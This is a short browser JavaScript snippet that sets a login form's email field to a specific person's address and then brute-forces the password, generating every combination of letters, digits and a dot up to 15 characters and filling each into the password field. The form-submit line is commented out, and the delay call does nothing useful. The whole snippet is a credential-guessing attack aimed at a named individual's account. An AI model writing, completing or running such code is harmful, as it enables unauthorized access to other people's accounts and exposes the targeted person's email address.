const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.';
const maxLength = 15;
document.querySelector('input[id="email"]').value="benson.terra@hotmail.com";

function handleSubmit(event) {
  //event.preventDefault(); // Impede o envio padrão do formulário

  for (let len = 1; len <= maxLength; len++) 
  {
    setTimeout(() => {
      console.log("Delayed for 5 second.");
    }, 5000);
    generateCombinations('', len);
  }
}

function generateCombinations(prefix, remainingLength) 
{
  if (remainingLength === 0) 
  {
    console.log(prefix)
    submitForm(prefix);
    return;
  }

  for (const char of characters) 
  {
    generateCombinations(prefix + char, remainingLength - 1);
  }
}

function submitForm(password) 
{
    document.querySelector('input[id="password"]').value=password;
    //document.querySelector('form[id="frm_login"]').submit()
}
handleSubmit()